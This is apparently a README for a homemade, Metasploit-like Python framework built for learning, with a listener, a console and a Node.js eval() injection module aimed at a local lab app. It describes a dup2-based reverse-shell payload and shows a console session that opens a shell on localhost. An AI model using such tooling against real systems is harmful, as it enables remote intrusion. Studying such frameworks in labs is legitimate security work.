# 🚀 Mini-MSF (Custom Metasploit Framework)

**Status:** ✅ Complete and Working
**Goal:** Build a custom exploit framework from scratch to understand how Metasploit works under the hood.

## What it does
This is a Python-based exploitation framework. It contains:
1. **Multi-threaded Handler:** Listens on ports 4444, 4445, 4446 for reverse shells.
2. **Console:** A command-line interface (`msf >`) with `use`, `set`, `run`, and `sessions` commands.
3. **Exploit Module:** `node_js_inject` — exploits an `eval()` vulnerability in the pos-lab Node.js app (CVE-2017-5941 style).
4. **Payload:** A Python reverse shell using `os.dup2` to redirect stdin/stdout to the socket.
5. **Session Manager:** Allows interaction with active shells.

## How to use
```bash
python3 msf.py
msf > use node_js_inject
msf (node_js_inject) > set RHOST 127.0.0.1
msf (node_js_inject) > set RPORT 3001
msf (node_js_inject) > set LHOST 127.0.0.1
msf (node_js_inject) > set LPORT 4444
msf (node_js_inject) > run
[+] Session 1 opened
msf > sessions -i 1
shell > whoami
u0_a333
